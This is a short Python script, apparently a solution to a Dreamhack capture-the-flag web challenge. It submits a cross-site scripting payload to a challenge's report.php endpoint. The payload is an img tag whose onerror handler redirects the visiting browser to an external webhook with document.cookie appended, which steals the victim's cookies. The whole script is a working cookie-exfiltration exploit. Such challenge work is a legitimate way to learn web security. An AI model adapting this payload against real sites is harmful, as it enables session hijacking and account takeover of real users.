import requests

url = "http://host3.dreamhack.games:11456/"

webhook = 'https://pobmppq.request.dreamhack.games'
payload = "index.php/,filter=[]//?page=vuln&param=<img src=x onerror=location.href=`%s/${document.cookie}`>" % webhook 

res = requests.post(f"{url}/report.php", data={
    'path': payload
})

print("> Payload submitted")